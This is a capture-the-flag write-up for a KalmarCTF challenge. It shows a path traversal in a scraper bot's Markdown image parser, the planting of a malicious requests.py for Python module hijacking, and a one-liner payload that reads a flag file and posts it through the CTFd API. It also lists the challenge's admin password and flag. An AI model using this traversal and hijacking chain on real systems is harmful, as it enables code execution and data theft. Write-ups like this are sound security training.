# KalmarCTF 2026 - EvilBabyKalmarCTF (Misc) Write-up

**Author:** BatoiDeA
**Category:** Misc / Web
**Key Techniques:** Path Traversal, Python Module Hijacking, Blind RCE, Bypassing WYSIWYG Editor Restrictions

---

# Challenge Description

> We've set up a standard CTFd instance for you. Oh, and there's a scraper bot running in the background downloading challenge files.
> You have admin access:
>
> **admin : i_solemnly_swear_that_i_am_up_to_no_good**
>
> Flag is located at `/flag.txt` inside the scraper container.

---

# TL;DR

The scraper bot runs a Python script (`download.py`) to parse CTFd challenges. A **Path Traversal vulnerability** in the bot's Markdown image parser allows us to download an arbitrary file to any location.

By writing a malicious **`requests.py`** file to `/tmp/`, we achieve **Python Module Hijacking**. When the bot restarts and imports `requests`, it executes our payload, reads `/flag.txt`, and exfiltrates it by creating a new **Page via the CTFd API**.

---

# 1. Initial Reconnaissance

Analyzing the provided Docker configuration, we notice a **scraper service** running on an internal network.

The container runs a loop that executes `download.py` every **30 seconds** to scrape challenges from the local CTFd instance.

```bash
while true; do
    sleep 30
    python3 /tmp/download.py ...
done
```

Reviewing the `download.py` source code, we identify a flaw in how it parses Markdown images from challenge descriptions.

```python
# download.py snippet
if link.startswith("!"):
    image_url = link.split("(")[1].split(")")[0]

    # Inadequate protection against Path Traversal
    if image_url[0] in ["/", "\\"]:
        image_url = image_url[1:]

    # Downloads the file and saves it
```

The script attempts to prevent absolute paths by stripping leading slashes, but it **does not filter `.` characters**, allowing **Path Traversal via `../`**.

Example payload:

```
![decoy](../../../../../../../tmp/evil.py)
```

The bot downloads the file from route:

```
tmp/evil.py
```

and writes it directly to:

```
/tmp/evil.py
```

inside the scraper container.

---

# 2. Exploit Strategy — Python Module Hijacking

At the top of `download.py`, the script imports several modules:

```python
import requests
import os
import argparse
```

The bot executes the script from:

```
/tmp/
```

Python's **module search order (`sys.path`) prioritizes the current working directory**, meaning `/tmp/` is searched **before standard libraries**.

Therefore:

If we place a malicious file named:

```
/tmp/requests.py
```

Python will import **our malicious module** instead of the legitimate `requests` package.

This results in **Remote Code Execution (RCE)**.

---

# 3. Bypassing CTFd Editor Restrictions

The scraper bot exists on an **internal network**, meaning it **cannot exfiltrate the flag externally** (e.g., webhook.site).

Instead, we must exfiltrate the flag **internally using the CTFd API**.

Since we have **Admin privileges**, our script can:

1. Read `/flag.txt`
2. Send a request to the **CTFd API**
3. Create a **new Page containing the flag**

## The Problem

To host the malicious `requests.py`, we use the **CTFd Pages feature**.

However, the editor heavily sanitizes content:

| Format   | Problem                             |
| -------- | ----------------------------------- |
| HTML     | Wraps code inside `<p>` tags        |
| Markdown | Removes line breaks and indentation |

Python relies on **indentation for syntax**, so this breaks most scripts.

---

# 4. The Solution — A Robust One-Liner

To bypass the formatting restrictions, we convert the exploit into a **single-line Python payload using semicolons**.

This avoids indentation and survives editor sanitization.

```python
import urllib.request, json; flag = open('/flag.txt', 'r').read().strip(); req = urllib.request.Request('http://ctfd:8000/api/v1/pages', data=json.dumps({'title':'flag_misc','route':'flag_misc','content':flag,'draft':False}).encode(), headers={'Content-Type':'application/json','Authorization':'Token YOUR_ADMIN_TOKEN_HERE'}); urllib.request.urlopen(req)
```

This payload:

1. Reads the flag
2. Sends a POST request to `/api/v1/pages`
3. Creates a public page containing the flag

---

# 5. Step-by-Step Exploitation

## Step 1 — Generate an Admin Token

Log in with the provided credentials:

```
admin : i_solemnly_swear_that_i_am_up_to_no_good
```

Navigate to:

```
Settings → Access Tokens
```

Generate a **new Admin API token**.

---

## Step 2 — Host the Payload

Navigate to:

```
Admin Panel → Pages → New Page
```

Configure:

```
Route: tmp/requests.py
Format: Markdown
```

Paste the **one-line payload** (with the generated token) into the content field and save.

---

## Step 3 — Trigger the Path Traversal

Navigate to:

```
Admin Panel → Challenges
```

Create or edit a challenge.

Ensure:

```
State = Visible
```

This is important because the **scraper bot cannot access hidden challenges**.

Insert the following payload into the **Description**:

```markdown
![decoy](../../../../../../../tmp/requests.py)
```

---

## Step 4 — Wait for the Bot

Within ~30 seconds, the scraper bot runs again.

Execution flow:

1. Bot reads the challenge description
2. Encounters the Markdown image payload
3. Downloads the file from `tmp/requests.py`
4. Saves it as `/tmp/requests.py`
5. Bot restarts the loop
6. `python3 /tmp/download.py` runs again
7. `import requests` loads **our malicious module**
8. Payload executes
9. Flag is posted to the **CTFd API**

---

# 6. Retrieving the Flag

Navigate to:

```
Admin Panel → Pages
```

A new page appears:

```
flag_misc
```

Opening the page reveals the flag.

---

# Flag

```
kalmar{EvilBabyKalmarCTF-wow_you_are_really_up_to_no_good_you_naughty_evil_wizard_ebba6deaa9865fb}
```

---

# Key Takeaways

* **Path Traversal vulnerabilities** can enable arbitrary file writes.
* Python's **module resolution order** makes module hijacking possible.
* **Internal service bots** can be exploited to achieve RCE.
* WYSIWYG editors often introduce **unexpected exploitation constraints**.
* Converting payloads into **one-liners** is a useful technique when formatting is restricted.

---

# Techniques Used

* Path Traversal
* Python Module Hijacking
* Blind RCE
* Internal API Abuse
* Markdown Parser Exploitation
* Editor Sanitization Bypass
